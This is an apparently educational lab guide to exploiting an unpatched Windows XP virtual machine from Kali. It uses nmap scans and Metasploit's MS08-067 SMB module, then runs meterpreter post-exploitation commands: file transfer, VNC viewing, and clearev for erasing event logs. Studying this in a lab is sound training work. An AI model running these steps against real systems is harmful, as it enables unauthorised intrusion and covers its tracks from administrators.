DISCLAIMER
1. These steps are for educational purposes only and for use at your own network laboratory. If you use these steps without
consent from the network owner, you’re on your own.

2. I am not responsible for any issues/damages to hardware or software by using any of the software mentioned in this guide
or damages by following the steps…do so at your own risk. I have tested these steps myself and found no issues/damage to my
own systems. Also, I am not responsible for software links, software availability or versions differences.

3. You will need to have common Linux knowledge to be able to follow this guide as well as what an .iso file is; installing
and configuring a Linux distro in a VM environment, general VM knowledge, and basic DOS commands. I will not be covering
these steps in this short guide. This guide is NOT for people that have no idea how to install, remove, update/upgrade, and
configure Linux/Windows O/S or VMs. Google is your best friend and research is part of the job.

COMMONS COMMANDS TO KNOW:
• ls		- Lists Files (LS)
• pwd		- Prints the current path to screen
• cd		- Call Directory
• mkdir		- Make Directory
• rm		- Deletes a folder and files in it (also rm –rf, or rmdir)
• cat		- Prints the contents of a file to screen
• ifconfig	- Displays local network information
• echo		- Repeats a command to screen and assist in creating a file (Windows)
• ren		- Rename a file or folder (Windows)

LEGEND:
• Commands: 	Words in BOLD are commands
• Comments: 	Words in italic red are comments or additional gitgcommands
• Important: 	Words with asterisk lines are important notes or comments
                ****************************************************

DEFAULT LOGINS:
• Kali: root/toor

WHAT YOU’LL NEED FOR THIS EXERCISE:
  • A computer with minimum: 8GB RAM, 6 Core CPU and a HDD of 500GB
  • ISO file of Windows XP SP2 or SP3 without Windows Update MS08_067
  • ISO file of the latest Kali release
  • OracleVirtualbox (free) or VMWare Workstation 12 or higher

******************************************************************************
NOTE: When using a VM make sure you change your resolution to the highest you can use without having any scroll bars on the
sides or the bottom of the screen.
******************************************************************************

SETUP:
1. Install the VM application you want, then install Kali and Windows XP as VMs.
2. Give the VMs:
  a. Windows = 1 CPU/1 Core, 1GB RAM, and 8GB of HDD space.
  b. Kali = 1 CPU/2 Cores, 4GB RAM and 40GB HDD space.
3. Maximize the GPU memory on both Kali (1GB) and XP (512MB).
  a. Do not use 3D on any of them.
4. Make sure both VMs networks are in NAT so they use the same network range. There is no need to be connected to the Internet for this to work.

Additionally, some things need to be changed in Windows XP for these steps to work.

First you need to turn OFF the Firewall…I know what you’re thinking, but it needs to happen. Second you need to turn ON the Audit Logon Event that
will recognize someone else is in the system. This is off by default and we need it on for training purposes. Also, if an administrator is good at
their job this would have been turned on.

To turn off the Firewall…
1. Click: Start > Control Panel > Firewall
2. Under the General tab select OFF then click OK

To turn on the Audit Logon Event…
1. Click: Start > Control Panel > Administrative Tools > Local Security Policy
2. Click: Local Policies > Audit Policy
3. Select: Audit logon events and select both check boxes
4. Close and go to Event Viewer
5. Select: Security and live it open
6. Return to Kali

Now we’re set. Continue on to Kali VM.

ATTACK:
1. Find your Kali IP address…
  a. Type: ifconfig
    i. Take notes

2. Scan for live-hosts…
  a. Type: nmap –sn <target_ip >/24
    i. Annotate your findings like IPs and their services running if any

3. Select your target and scan for open ports in stealth mode…
  a. Type: nmap –sS –Pn <target_ip>
    i. Notice the SMB port service is running…we’ll use it on our attack

4. Open a new terminal and run metasploit…
  a. Type: msfconsole
  b. Type: use exploit/windows/smb/ms08_067_netapi
    i. Have you used the TAB key to autocomplete a command?
  c. Type: set
    i. Look at your options…also use the show options if you cannot find the RHOST
  d. Type: set RHOST <target_ip>
    i. Type set again or show options to see the changes
  e. Type: run to start
    i. Or type exploit

******************************************************************************
NOTE: You’re in meterpreter, a command shell connecting you to your target.
******************************************************************************

1. In meterpreter, find out where you’re at this time…
  a. Type: pwd

2. Find some information about the target…
  a. Type: sysinfo
    i. Take notes

3. Go to the root drive (C:\)…
  a. Type: cd \\
    i. While in meterpreter you have to use double \\ to move around directories
    ii. If you were in a DOS shell you can use a single \

4. Verify you’re in c:\…
  a. Type: pwd

5. Find network information…
  a. Type: ipconfig
    i. ipconfig in meterpreter is cleaner than in a DOS shell

******************************************************************************
NOTE: Meterpreter can use both ipconfig or ifconfig…they work the same.
******************************************************************************

6. View the directory…
  a. Type: ls

7. Create a folder in the target…
  a. Type: mkdir whoops

8. Go to a shell…
  a. Type: shell

9. Rename the folder whoops…
  a. Type: ren whoops gothacked

10. Verify the name was changed…
  a. Type: dir

11. Go into that folder…
  a. Type: cd gothacked

12. Create a file with text in it…
  a. Type: shell
    i. Or if in meterpreter type: execute –f cmd.exe –i –H
  b. Type:  echo “this computer was hacked by me!” > hacked.txt
  c. Type: exit
    i. You’re back in meterpreter

13.	Verify the file is there…
  a.	Type: ls or dir
  b.	Type: cd gothacked
  c.	Type: cat hacked.txt

14. Download the text file…
  a. Type: download hacked.txt

15. Background the session…
  a. Type: background
    i. Take note of the ID number for this session

16. Verify the file is in YOUR computer…
  a. Type: ls or dir
    i. You can also open a new terminal and check

15. Open a new terminal and edit the file…
  a. Type: nano hacked.txt
  b. In a new line type: don’t forget to smile!
  c. Type: # (hash tag/pound) in front of the first line to comment it out
  d. Save it: Ctrl+S
  e. Ctrl+X to exit

16. Find the correct session ID for this attack…
  a. Type: sessions
  b. Type: sessions –i <#>
    i. Replace the <#> with the correct number for the session

******************************************************************************
NOTE: You’re back in meterpreter!
******************************************************************************

17. Upload the file back to the target…
a. Type: upload hacked.txt

18. Get a GUI of the target machine…
  a. Type: run vnc
    i.	Wait a few seconds for this to work…if it doesn’t then there might be something blocking the connection.

******************************************************************************
NOTE: With this VNC connection you can control the mouse; it’s just a viewing option so you can see what
the user is actually doing.
******************************************************************************

19. Go into Events in Windows and look at all the logs

20. STOP! Instead of clearing the logs now we will move on to make a new user to maintain persistence. But in case you
were curious, the command to clear the logs is:
  a. Type: clearev
    i. This will erase all logs and the admin will see someone was in the system…use it if you DON'T plan to return to
    this system

******************************************************************************
NOTE: Continue to the Maintain Persistence Guide

EXERCISE QUESTIONS:
In Linux, folders and files are considered the same thing…files. Do some research and answer the following questions:

1. What does the command (dir) in Windows do? What is the equivalent in Linux?

2. What is a file or folder that begins with a period (.) in its name?

3. What is the command used to you look for those files with a period in their name? Use it.

4. What is the command used to delete a folder that contains files/is not empty?

5. What is the command to create a “folder”?

6. What is the command to rename a file?

7. What is a VNC? What other program will you need for it to work?

8. What is nano and VIM? One of them is easier than the other.

9. Use a text editor to create a text file with some contents in it.

10. What is the command to read a file’s contents without opening it in a text editor?

11. What are the commands used to update and upgrade Linux with the latest fixes/patches?

12. Can you combine both of the update/upgrade commands to work as a single command? How?

13. What is the command to delete temporary files after an update/upgrade?

14. What does BASH stand for and with what declaration does the script start?

15. Write a small BASH script to update/upgrade you Linux machine.

16. What is the command to use to make a BASH script executable?

17. What is the command to tell a script to automatically continue without user input? Include it in your BASH script.

18. UFW stands for Uncomplicated Firewall. Do you have UFW installed?

19. What is the command to do a search for open source software available for Linux users?

20. Using the installation command, install UFW on your Linux machine.

21. What is the man-page?

22. Using the man-page (or the help description that every program comes with) find out if UFW is running or not? If not then
enable it.

23. Using your ninja-like research abilities (Google), find out what ports are most common for hackers to attack and go
disable them in UFW.

24. Using nmap, search for open ports on your system and check if you successfully blocked any of the ports you blocked in
UFW. Do you have open ports even after you closed them? Why is this?

25. In a few words, describe the difference between the command nmap –Pn and nmap –sn.

26. One of these command just pings to see if there are live-hosts, the other searches for live-hosts and ports running. Which
one does what?

27. Using the help flag or man-page, which nmap command will give you’re the O/S version and services running at the same time?
What other commands give you similar information?

28. What is banner grabbing? What commands can you use to do this?

29.	What other commands did we use in this guide to get target information?
